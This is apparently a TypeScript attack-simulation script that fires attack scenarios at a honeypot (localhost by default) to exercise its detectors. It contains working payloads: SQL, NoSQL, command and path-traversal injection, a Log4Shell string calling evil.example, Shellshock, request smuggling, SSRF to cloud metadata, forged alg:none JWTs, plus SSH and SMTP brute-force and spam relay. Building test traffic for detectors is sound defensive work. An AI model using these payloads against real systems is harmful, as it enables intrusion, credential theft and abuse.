import net from "node:net";
import { setTimeout as delay } from "node:timers/promises";
import { Client } from "ssh2";

const baseUrl = process.env.HONEYPOT_URL ?? "http://localhost:4004";
const host = new URL(baseUrl).hostname;
const httpPort = Number(new URL(baseUrl).port || 80);

interface Result {
  label: string;
  status?: number;
  ms: number;
  note?: string;
}

// Each scenario runs under its own spoofed source IP (the dev server trusts
// X-Forwarded-For) so one scenario's suspicion score doesn't get the shared
// localhost IP blocked before the next scenario's detector can be observed.
let sourceIp = "203.0.113.1";

async function hit(method: string, path: string, opts: { headers?: Record<string, string>; body?: string; label?: string } = {}): Promise<Result> {
  const start = Date.now();
  try {
    const res = await fetch(baseUrl + path, { method, headers: { "X-Forwarded-For": sourceIp, ...opts.headers }, body: opts.body });
    await res.text();
    return { label: opts.label ?? `${method} ${path}`, status: res.status, ms: Date.now() - start };
  } catch (err) {
    return { label: opts.label ?? `${method} ${path}`, ms: Date.now() - start, note: `error: ${(err as Error).message}` };
  }
}

function log(scenario: string, r: Result): void {
  const status = r.status ?? "---";
  console.log(`  [${scenario}] ${r.label} -> ${status} in ${r.ms}ms${r.note ? ` (${r.note})` : ""}`);
}

// Send a hand-crafted raw HTTP/1.1 request over a socket — fetch refuses to set
// forbidden headers (Content-Length, Transfer-Encoding, Host) or an absolute
// request target, which is exactly what these attacks need.
function rawRequest(requestLine: string, headers: Record<string, string>, body: string, label: string): Promise<Result> {
  const start = Date.now();
  return new Promise((resolve) => {
    const socket = net.createConnection({ host, port: httpPort }, () => {
      const lines = [requestLine, `Host: ${host}`, `X-Forwarded-For: ${sourceIp}`, ...Object.entries(headers).map(([k, v]) => `${k}: ${v}`), "", body];
      socket.write(lines.join("\r\n"));
    });
    let data = "";
    socket.setTimeout(8000, () => socket.destroy());
    socket.on("data", (chunk) => {
      data += chunk.toString();
      socket.end();
    });
    socket.on("close", () => {
      const match = data.match(/^HTTP\/\d\.\d (\d{3})/);
      const result: Result = { label, ms: Date.now() - start };
      if (match) result.status = Number(match[1]);
      resolve(result);
    });
    socket.on("error", (err) => resolve({ label, ms: Date.now() - start, note: `error: ${err.message}` }));
  });
}

// --- scenarios, one per detector -------------------------------------------

async function decoys(): Promise<void> {
  console.log("\n# decoy-path — probing paths only an attacker would know");
  const probes: Array<[string, string]> = [
    ["GET", "/.env"],
    ["GET", "/.git/config"],
    ["GET", "/.aws/credentials"],
    ["GET", "/wp-login.php"],
    ["GET", "/actuator/env"],
    ["POST", "/_ignition/execute-solution"],
  ];
  for (const [method, path] of probes) log("decoy", await hit(method, path));
}

async function pathBruteforce(): Promise<void> {
  console.log("\n# path-bruteforce — enumerating many distinct paths fast");
  const words = ["admin", "backup", "old", "test", "api", "dev", "staging", "hidden", "private", "secret", "tmp", "uploads", "data", "logs", "config", "db", "sql", "www", "web", "assets"];
  for (const word of words) log("brute", await hit("GET", `/${word}-${Math.random().toString(36).slice(2, 6)}`));
}

async function credentialBruteforce(): Promise<void> {
  console.log("\n# credential-bruteforce — hammering a login endpoint");
  for (let i = 0; i < 10; i++) {
    log("creds", await hit("POST", "/login", { headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `username=admin&password=guess${i}` }));
  }
}

async function rateSpike(): Promise<void> {
  console.log("\n# rate-spike — flooding requests from one IP");
  const start = Date.now();
  const results = await Promise.all(Array.from({ length: 80 }, () => hit("GET", "/")));
  const flagged = results.filter((r) => r.status && r.status !== 404).length;
  console.log(`  [rate] sent 80 requests in ${Date.now() - start}ms, ${flagged} drew a non-404 (flagged) response`);
}

async function scannerSignature(): Promise<void> {
  console.log("\n# scanner-signature — requests carrying tool User-Agents");
  for (const ua of ["sqlmap/1.7", "Nikto/2.5.0", "gobuster/3.6", ""]) {
    log("scanner", await hit("GET", "/", { headers: ua ? { "User-Agent": ua } : {}, label: `UA=${ua || "(none)"}` }));
  }
}

async function payloadInjection(): Promise<void> {
  console.log("\n# payload-injection — exploitation payloads in path/query/body");
  log("inject", await hit("GET", "/files?path=" + encodeURIComponent("../../../../etc/passwd")));
  log("inject", await hit("GET", "/search?q=" + encodeURIComponent("' UNION SELECT username,password FROM users--")));
  log("inject", await hit("GET", "/page?name=" + encodeURIComponent("<script>document.cookie</script>")));
  log("inject", await hit("GET", "/", { headers: { "User-Agent": "${jndi:ldap://evil.example/a}" }, label: "Log4Shell in UA" }));
  log("inject", await hit("POST", "/api/run", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cmd: "; cat /etc/passwd" }), label: "cmd-injection in body" }));
}

async function suspiciousMethod(): Promise<void> {
  console.log("\n# suspicious-method — verbs no browser sends");
  for (const method of ["PROPFIND", "TRACE", "MKCOL"]) log("method", await hit(method, "/"));
}

async function portScan(): Promise<void> {
  console.log("\n# port-scan — sweeping the port-scan sentinel's TCP ports");
  const ports = (process.env.SCAN_PORTS ?? "8022,9200,7001").split(",").map((p) => Number(p.trim()));
  for (const port of ports) {
    const start = Date.now();
    await new Promise<void>((resolve) => {
      const socket = net.createConnection({ host, port }, () => {
        socket.write("GET / HTTP/1.0\r\n\r\n");
        socket.end();
      });
      let banner = "";
      socket.on("data", (chunk) => (banner += chunk.toString()));
      socket.on("close", () => {
        console.log(`  [scan] connected to :${port} in ${Date.now() - start}ms${banner ? ` banner=${JSON.stringify(banner.trim())}` : ""}`);
        resolve();
      });
      socket.on("error", (err) => {
        console.log(`  [scan] :${port} error: ${err.message}`);
        resolve();
      });
    });
  }
}

async function sensitiveFile(): Promise<void> {
  console.log("\n# sensitive-file — probing for backup/dump/source/VCS files");
  for (const path of ["/wp-config.php.bak", "/index.php~", "/database.sql", "/.svn/entries", "/site-backup.tar.gz", "/.idea/workspace.xml"]) {
    log("file", await hit("GET", path));
  }
}

async function headerAnomaly(): Promise<void> {
  console.log("\n# header-anomaly — protocol-level abnormalities (raw crafted requests)");
  log("hdr", await rawRequest("GET / HTTP/1.1", { "User-Agent": "() { :; }; /bin/bash -c id" }, "", "Shellshock in UA"));
  log("hdr", await rawRequest("POST / HTTP/1.1", { "Content-Length": "4", "Transfer-Encoding": "chunked" }, "test", "CL+TE request smuggling"));
  log("hdr", await rawRequest("GET http://example.com/ HTTP/1.1", {}, "", "absolute-form target (proxy abuse)"));
}

async function honeytoken(): Promise<void> {
  console.log("\n# honeytoken — replaying a seeded fake credential (highest-confidence signal)");
  const token = process.env.HONEYTOKEN ?? "AKIA_HACKERPOT_HONEYTOKEN_DEMO";
  log("token", await hit("GET", "/api/account", { headers: { Authorization: `Bearer ${token}` }, label: "seeded token in Authorization header" }));
  log("token", await hit("GET", `/data?key=${encodeURIComponent(token)}`, { label: "seeded token in query" }));
}

async function ssrf(): Promise<void> {
  console.log("\n# ssrf-probe — pointing the server at internal / metadata targets");
  log("ssrf", await hit("GET", "/fetch?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/"), { label: "cloud metadata IP" }));
  log("ssrf", await hit("GET", "/preview?target=" + encodeURIComponent("file:///etc/passwd"), { label: "file:// scheme" }));
  log("ssrf", await hit("GET", "/proxy?u=" + encodeURIComponent("http://127.0.0.1:6379/"), { label: "loopback service" }));
}

async function openRedirect(): Promise<void> {
  console.log("\n# open-redirect — bouncing a victim off-site");
  log("redir", await hit("GET", "/login?next=" + encodeURIComponent("//evil.example/phish"), { label: "protocol-relative //evil" }));
  log("redir", await hit("GET", "/go?url=" + encodeURIComponent("https://evil.example/account"), { label: "absolute off-site URL" }));
}

async function crlf(): Promise<void> {
  console.log("\n# crlf-injection — smuggling headers via CR/LF");
  log("crlf", await hit("GET", "/redirect?to=foo%0d%0aSet-Cookie:%20admin=1", { label: "Set-Cookie smuggle in query" }));
  log("crlf", await hit("GET", "/page?lang=en%0d%0aContent-Length:%200", { label: "response split in query" }));
}

async function nosql(): Promise<void> {
  console.log("\n# nosql-injection — MongoDB operator injection");
  log("nosql", await hit("GET", "/account?user[$ne]=", { label: "operator in query key (user[$ne])" }));
  log("nosql", await hit("POST", "/login", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "admin", password: { $ne: null } }), label: "auth bypass {password:{$ne:null}}" }));
  log("nosql", await hit("GET", "/search?q=" + encodeURIComponent('{"$where":"sleep(5000)"}'), { label: "$where JS execution in query" }));
}

async function graphql(): Promise<void> {
  console.log("\n# graphql-abuse — introspection + deep-nesting DoS");
  log("gql", await hit("POST", "/graphql", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ query: "query IntrospectionQuery { __schema { types { name fields { name } } } }" }), label: "schema introspection" }));
  const deep = "query{" + "wrap{".repeat(20) + "id" + "}".repeat(20) + "}";
  log("gql", await hit("POST", "/graphql", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ query: deep }), label: "deeply nested query (depth 20)" }));
}

async function jwt(): Promise<void> {
  console.log("\n# jwt-weakness — alg:none token forgery");
  const b64 = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
  const noneJwt = `${b64({ alg: "none", typ: "JWT" })}.${b64({ sub: "admin", role: "superuser" })}.`;
  log("jwt", await hit("GET", "/api/admin", { headers: { Authorization: `Bearer ${noneJwt}` }, label: 'alg:"none" forged token' }));
}

async function clientAnomaly(): Promise<void> {
  console.log("\n# client-anomaly — browser UA with no browser headers (raw request)");
  // Raw request so fetch/undici doesn't auto-add Accept headers: a bot spoofing
  // Chrome's UA but sending none of the Accept-* headers a real browser sends.
  log("client", await rawRequest("GET / HTTP/1.1", { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" }, "", "spoofed Chrome UA, no Accept headers"));
}

async function prototypePollution(): Promise<void> {
  console.log("\n# prototype-pollution — __proto__ / constructor.prototype injection");
  log("proto", await hit("GET", "/api/merge?a[__proto__][isAdmin]=true", { label: "__proto__ in query key" }));
  log("proto", await hit("POST", "/api/merge", { headers: { "Content-Type": "application/json" }, body: JSON.stringify({ __proto__: { isAdmin: true } }), label: "__proto__ in JSON body" }));
}

async function deserialization(): Promise<void> {
  console.log("\n# insecure-deserialization — serialized-object payloads");
  log("deser", await hit("GET", "/api/data", { headers: { Cookie: "sess=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUKuAABAAA" }, label: "Java serialized in cookie (rO0AB)" }));
  log("deser", await hit("POST", "/api/import", { headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'obj=O:4:"Evil":1:{s:3:"cmd";s:2:"id";}', label: "PHP object injection in body" }));
}

async function hostHeader(): Promise<void> {
  console.log("\n# host-header-injection — malformed Host (raw request)");
  log("host", await rawRequestHost("evil.example/password-reset", "malformed Host with a path"));
}

// Like rawRequest but sends a custom Host header instead of the default.
function rawRequestHost(hostValue: string, label: string): Promise<Result> {
  const start = Date.now();
  return new Promise((resolve) => {
    const socket = net.createConnection({ host, port: httpPort }, () => {
      socket.write([`GET / HTTP/1.1`, `Host: ${hostValue}`, `X-Forwarded-For: ${sourceIp}`, `User-Agent: mozilla`, "", ""].join("\r\n"));
    });
    let data = "";
    socket.setTimeout(8000, () => socket.destroy());
    socket.on("data", (c) => { data += c.toString(); socket.end(); });
    socket.on("close", () => { const m = data.match(/^HTTP\/\d\.\d (\d{3})/); const r: Result = { label, ms: Date.now() - start }; if (m) r.status = Number(m[1]); resolve(r); });
    socket.on("error", (e) => resolve({ label, ms: Date.now() - start, note: `error: ${e.message}` }));
  });
}

async function webShell(): Promise<void> {
  console.log("\n# web-shell — reaching for a dropped backdoor");
  log("shell", await hit("GET", "/wso.php", { label: "known web-shell filename" }));
  log("shell", await hit("GET", "/uploads/avatar.php?cmd=id", { label: "script in upload dir + exec param" }));
  log("shell", await hit("GET", "/images/logo.jsp", { label: "JSP in a static dir" }));
}

async function smtp(): Promise<void> {
  console.log("\n# smtp — mail-server abuse against the SMTP honeypot");
  const smtpPort = Number(process.env.SMTP_PORT ?? 2525);
  // Timer-driven: the server is silent during DATA (until the lone dot), so we
  // send lines on a fixed cadence rather than waiting for a reply to each.
  const runSmtp = (label: string, lines: string[]) =>
    new Promise<void>((resolve) => {
      const socket = net.createConnection({ host, port: smtpPort }, () => {});
      let transcript = "";
      socket.setTimeout(8000, () => socket.destroy());
      socket.on("data", (d) => (transcript += d.toString()));
      socket.on("close", () => {
        const codes = [...transcript.matchAll(/^(\d{3})/gm)].map((m) => m[1]).join(" ");
        console.log(`  [smtp] ${label} — server codes: ${codes}`);
        resolve();
      });
      socket.on("error", (e) => { console.log(`  [smtp] ${label} — error: ${e.message}`); resolve(); });
      socket.on("connect", async () => {
        await delay(200); // let the 220 greeting arrive
        for (const line of lines) { socket.write(line + "\r\n"); await delay(150); }
        await delay(200);
        socket.end();
      });
    });

  await runSmtp("AUTH LOGIN brute-force", ["EHLO attacker.example", "AUTH LOGIN", Buffer.from("admin").toString("base64"), Buffer.from("P@ssw0rd").toString("base64"), "QUIT"]);
  await runSmtp("open-relay + spam", ["EHLO attacker.example", "MAIL FROM:<spammer@evil.example>", "RCPT TO:<victim@somewhere-else.example>", "DATA", "Subject: cheap pills", "", "buy now http://spam.example", ".", "QUIT"]);
  await runSmtp("VRFY user enumeration", ["HELO attacker.example", "VRFY root", "VRFY admin", "QUIT"]);
}

async function ssh(): Promise<void> {
  console.log("\n# ssh — password brute-force against the SSH honeypot");
  const sshPort = Number(process.env.SSH_PORT ?? 2222);
  const creds: Array<[string, string]> = [["root", "root"], ["root", "123456"], ["admin", "admin"], ["root", "toor"], ["ubuntu", "password"]];
  for (const [username, password] of creds) {
    await new Promise<void>((resolve) => {
      const conn = new Client();
      const done = (note: string) => { console.log(`  [ssh] ${username}:${password} — ${note}`); resolve(); };
      conn.on("ready", () => { conn.end(); done("unexpectedly accepted"); });
      conn.on("error", (e) => done(`rejected (${e.message.split(":")[0]})`));
      conn.connect({ host, port: sshPort, username, password, hostVerifier: () => true, readyTimeout: 4000 });
    });
    await delay(120);
  }
}

const scenarios: Record<string, () => Promise<void>> = {
  decoys,
  "path-bruteforce": pathBruteforce,
  "credential-bruteforce": credentialBruteforce,
  "rate-spike": rateSpike,
  "scanner-signature": scannerSignature,
  "payload-injection": payloadInjection,
  "suspicious-method": suspiciousMethod,
  "sensitive-file": sensitiveFile,
  "header-anomaly": headerAnomaly,
  "ssrf-probe": ssrf,
  "open-redirect": openRedirect,
  "crlf-injection": crlf,
  "nosql-injection": nosql,
  "graphql-abuse": graphql,
  "jwt-weakness": jwt,
  "client-anomaly": clientAnomaly,
  "prototype-pollution": prototypePollution,
  "insecure-deserialization": deserialization,
  "host-header-injection": hostHeader,
  "web-shell": webShell,
  honeytoken,
  "port-scan": portScan,
  smtp,
  ssh,
};

async function main(): Promise<void> {
  const arg = process.argv[2];
  if (!arg) {
    console.error("Usage: npm run attack -- <scenario|all>");
    console.error(`Scenarios: ${Object.keys(scenarios).join(", ")}`);
    process.exitCode = 1;
    return;
  }

  console.log(`Target: ${baseUrl}`);
  const toRun = arg === "all" ? Object.values(scenarios) : scenarios[arg] ? [scenarios[arg]] : [];
  if (toRun.length === 0) {
    console.error(`Unknown scenario: ${arg}`);
    console.error(`Scenarios: ${Object.keys(scenarios).join(", ")}`);
    process.exitCode = 1;
    return;
  }

  let octet = 10;
  for (const scenario of toRun) {
    sourceIp = `203.0.113.${octet++}`; // fresh attacker IP per scenario
    await scenario!();
    if (toRun.length > 1) await delay(300);
  }
}

main().catch((err: unknown) => {
  console.error(err);
  process.exitCode = 1;
});
